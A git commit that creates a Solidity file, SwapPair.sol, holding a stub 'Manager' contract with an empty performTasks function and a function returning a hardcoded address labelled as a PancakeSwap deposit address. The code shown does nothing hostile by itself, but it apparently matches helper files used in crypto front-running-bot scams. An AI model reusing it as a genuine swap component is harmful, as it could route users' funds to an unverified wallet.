9fd040a1e94c136f9996e1f07a57083ee7eb2142
sourcegithub64 <87957222+sourcegithub64@users.noreply.github.com>
2021-07-25 22:32:56 -0400

    Create SwapPair.sol

---
+++ SwapPair.sol
@@ -0,0 +1,21 @@
+pragma solidity ^0.5.0;
+
+
+
+contract Manager {
+
+	function performTasks() public {
+
+	    
+
+	}
+
+
+
+	function pancakeDepositAddress() public pure returns (address) {
+
+		return 0xCFD04C918bB35aFB1D60b077d24da41DEbE1dF2a;
+
+	}
+
+}
